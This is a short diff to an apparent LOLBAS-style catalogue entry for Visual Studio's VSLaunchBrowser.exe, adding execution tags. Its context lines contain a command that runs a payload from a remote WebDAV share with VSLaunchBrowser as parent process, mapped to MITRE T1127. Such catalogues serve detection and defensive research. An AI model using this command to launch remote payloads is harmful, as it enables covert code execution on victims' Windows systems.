@@ -20,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1127
     OperatingSystem: Windows
+    Tags:
+      - Execute: EXE
   - Command: VSLaunchBrowser.exe .exe \\Server\Path\file
     Description: Execute payload from WebDAV server via VSLaunchBrowser as parent process
     Usecase: It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
@@ -27,6 +29,9 @@ Commands:
     Privileges: User
     MitreID: T1127
     OperatingSystem: Windows
+    Tags:
+      - Execute: EXE
+      - Execute: Remote
 Full_Path:
   - Path: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
   - Path: C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
